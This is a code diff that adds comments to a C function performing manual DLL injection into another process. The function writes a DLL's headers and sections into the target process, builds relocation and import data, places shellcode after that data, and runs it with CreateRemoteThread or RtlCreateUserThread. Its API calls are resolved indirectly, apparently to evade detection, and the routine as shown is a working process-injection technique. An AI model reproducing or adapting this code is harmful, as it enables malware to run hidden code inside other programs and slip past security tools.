@@ -47,6 +47,7 @@ BOOL InjectDll(BYTE *dllBuffer, HANDLE hProcess, BOOL x64)
    if(!hProcess)
       return FALSE;
 
+   // get PE header
    IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *) dllBuffer;
    IMAGE_NT_HEADERS64 *ntHeaders64;
    IMAGE_NT_HEADERS32 *ntHeaders32;
@@ -55,6 +56,7 @@ BOOL InjectDll(BYTE *dllBuffer, HANDLE hProcess, BOOL x64)
    else
       ntHeaders32 = (IMAGE_NT_HEADERS32 *) (dllBuffer + dosHeader->e_lfanew);
 
+   // allocate enough memory in the target process to store the dll
    DWORD64 dllRemoteAddress = NULL;
    if(x64)
    {
@@ -69,6 +71,7 @@ BOOL InjectDll(BYTE *dllBuffer, HANDLE hProcess, BOOL x64)
    if(!dllRemoteAddress)
       return FALSE;
 
+   // allocate enough memory in the target process to store the shellcode (payload) and injectdata (an argument of the payload function) 
    DWORD64 payloadRemoteAddress = NULL;
    if(x64)
    {
@@ -130,6 +133,8 @@ BOOL InjectDll(BYTE *dllBuffer, HANDLE hProcess, BOOL x64)
 
       DWORD64 hThread;
 
+      // the code above has the same meaning as the code for x86 target process
+      // the code below uses wow64ext function X64Call to run RtlCreateUserThread function in x64 target proccess 
       struct CLIENT_ID { DWORD64 UniqueProcess; DWORD64 UniqueThread; };
       CLIENT_ID clientId;
 
@@ -142,14 +147,19 @@ BOOL InjectDll(BYTE *dllBuffer, HANDLE hProcess, BOOL x64)
    }
    else
    {
+      // get the addres of the first section header in the dll (PE header address + offset on sizeof(PE header) bytes)
       sectionHeader = (IMAGE_SECTION_HEADER *) (ntHeaders32 + 1);
+      // writes in the terget process only the header of the dll
       if(!Funcs::pWriteProcessMemory(hProcess, (PVOID) dllRemoteAddress, dllBuffer, ntHeaders32->OptionalHeader.SizeOfHeaders, NULL))
          return FALSE;
          
+      // for each section in the dll do ... 
       for(DWORD i = 0; i < ntHeaders32->FileHeader.NumberOfSections; ++i)
       {
+         // skip if it is empty
          if(sectionHeader[i].SizeOfRawData == 0)
             continue;  
+         // write the section in the corresponding address of the target process (image base is dllRemoteAddress) 
          if(!Funcs::pWriteProcessMemory(hProcess, (PVOID) ((BYTE *) dllRemoteAddress + sectionHeader[i].VirtualAddress), 
             (PVOID) ((BYTE *) dllBuffer + sectionHeader[i].PointerToRawData), sectionHeader[i].SizeOfRawData, NULL))
          {
@@ -157,17 +167,22 @@ BOOL InjectDll(BYTE *dllBuffer, HANDLE hProcess, BOOL x64)
          }
       }
 
+      // set the image base with the address of injacted dll in target process
       InjectData32 injectData32;
       injectData32.base = (DWORD) dllRemoteAddress;
 
-      injectData32.baseRelocation = (DWORD) (IMAGE_BASE_RELOCATION *) ((BYTE *) dllRemoteAddress + 
+      // set the base relocation table address
+     injectData32.baseRelocation = (DWORD) (IMAGE_BASE_RELOCATION *) ((BYTE *) dllRemoteAddress + 
          ntHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 
+      // set import dirictory table
       injectData32.importDesc = (DWORD) (IMAGE_IMPORT_DESCRIPTOR *) ((BYTE *) dllRemoteAddress + 
          ntHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 
+      // get the handle of ntdll (always linked staticaly)
       HMODULE hNtdll = Funcs::pLoadLibraryA(Strs::ntdll);
 
+      // get the addresses of functions in ntdll in current process (they are the same in target process)
       injectData32.aRtlInitAnsiString            = (DWORD) GetProcAddress(hNtdll, Strs::rtlInitAnsiString);
       injectData32.aRtlAnsiStringToUnicodeString = (DWORD) GetProcAddress(hNtdll, Strs::rtlAnsiStringToUnicodeString);
       injectData32.aLdrLoadDll                   = (DWORD) GetProcAddress(hNtdll, Strs::ldrLoadDll);
@@ -176,24 +191,29 @@ BOOL InjectDll(BYTE *dllBuffer, HANDLE hProcess, BOOL x64)
 
       injectData = &injectData32;
 
+      // write the gathared data in front of shellcode (the pointer to this data should be sent to Payload function as an argument)
       if(!Funcs::pWriteProcessMemory(hProcess, (PVOID) payloadRemoteAddress, injectData, sizeof(InjectData32), NULL))
          return FALSE;
 
+      // write the shellcode (payload) after injected data
       if(!Funcs::pWriteProcessMemory(hProcess, (BYTE *) payloadRemoteAddress + sizeof(InjectData32), (LPVOID) payload32, payloadSize32, NULL))
          return FALSE;
 
+      // check the windows version
       OSVERSIONINFOEXA osVersion    = { 0 };
       osVersion.dwOSVersionInfoSize = sizeof(osVersion);
       Funcs::pGetVersionExA((LPOSVERSIONINFOA) &osVersion); 
-      if(osVersion.dwMajorVersion <= 5)
+      if(osVersion.dwMajorVersion <= 5) // if the version is older than vista
       {
+         // run payload function with injectdata argument
          if(!Funcs::pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) ((BYTE *) payloadRemoteAddress + sizeof(InjectData32)), (PVOID) payloadRemoteAddress, 0, NULL))
             return FALSE;
       }      
-      else
+      else // vista and later
       {
          HANDLE    hThread;
          CLIENT_ID clientId;
+         // run payload function with injectdata argument
          if(Funcs::pRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, ((BYTE *) payloadRemoteAddress + sizeof(InjectData32)), (PVOID) payloadRemoteAddress, &hThread, &clientId))
             return FALSE;   
       }
